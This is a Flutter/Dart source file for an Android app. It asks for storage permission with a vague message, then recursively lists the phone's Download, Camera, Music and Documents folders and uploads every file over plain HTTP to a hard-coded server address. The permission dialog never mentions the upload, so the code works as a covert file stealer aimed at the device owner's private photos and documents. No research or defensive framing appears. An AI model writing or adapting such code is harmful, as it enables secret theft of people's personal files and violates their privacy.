import 'dart:io';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import 'package:http/http.dart' as http;

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: MyHomePage(),
    );
  }
}

class MyHomePage extends StatefulWidget {
  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  List<FileSystemEntity> _files = [];
  String _error = '';

  @override
  void initState() {
    super.initState();
    _showPermissionDialog();
  }

  Future<void> _showPermissionDialog() async {
    showDialog(
      context: context,
      builder: (BuildContext context) {
        return AlertDialog(
          title: const Text('Permission Required'),
          content: const Text('This app needs access to your storage to function properly. Do you want to allow access?'),
          actions: <Widget>[
            TextButton(
              child: const Text('Cancel'),
              onPressed: () {
                Navigator.of(context).pop();
              },
            ),
            TextButton(
              child: const Text('Allow'),
              onPressed: () async {
                Navigator.of(context).pop();
                await _requestPermission();
              },
            ),
          ],
        );
      },
    );
  }

  Future<void> _requestPermission() async {
    var status = await Permission.storage.status;
    if (status.isDenied || status.isRestricted || status.isPermanentlyDenied) {
      Map<Permission, PermissionStatus> statuses = await [
        Permission.storage,
      ].request();

      if (statuses[Permission.storage]!.isGranted) {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text("Storage Permission Granted")),
        );
        await _accessFiles();
      } else {
        ScaffoldMessenger.of(context).showSnackBar(
          const SnackBar(content: Text("Storage Permission Denied")),
        );
      }
    } else if (status.isGranted) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Storage Permission Already Granted")),
      );
      await _accessFiles();
    }
  }

  Future<void> _accessFiles() async {
    try {
      final directories = [
        await getExternalStorageDirectory(), // App-specific external storage
        Directory('/storage/emulated/0/Download'), // Download folder
        Directory('/storage/emulated/0/DCIM/Camera'), // Pictures folder
        Directory('/storage/emulated/0/Music'), // Music folder
        Directory('/storage/emulated/0/Documents'), // Documents folder
      ];

      List<FileSystemEntity> allFiles = [];

      for (var dir in directories) {
        if (dir != null && await dir.exists()) {
          allFiles.addAll(dir.listSync(recursive: true));
        }
      }

      setState(() {
        _files = allFiles;
      });

      // Upload files to the server
      for (var file in allFiles) {
        await _uploadFile(file);
      }
    } catch (e) {
      setState(() {
        _error = 'Error accessing files: $e';
      });
    }
  }

  Future<void> _uploadFile(FileSystemEntity file) async {
    if (file is File) {
      try {
        final uri = Uri.parse('http://172.20.10.4:4545/upload'); // Replace with your server URL
        final request = http.MultipartRequest('POST', uri)
          ..files.add(await http.MultipartFile.fromPath('file', file.path));

        final response = await request.send();
        if (response.statusCode == 200) {
          print('File uploaded successfully: ${file.path}');
        } else {
          print('Failed to upload file: ${file.path}');
        }
      } catch (e) {
        print('Error uploading file: ${file.path}, $e');
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('File Access and Upload'),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            ElevatedButton(
              onPressed: _showPermissionDialog,
              child: const Text('Request Storage Permission'),
            ),
            _error.isNotEmpty
                ? Text('Error: $_error')
                : Expanded(
              child: ListView.builder(
                itemCount: _files.length,
                itemBuilder: (context, index) {
                  final file = _files[index];
                  return ListTile(
                    title: Text(file.path),
                    subtitle: file is File
                        ? Text(file.lengthSync().toString() + ' bytes')
                        : Text('Directory'),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }
}
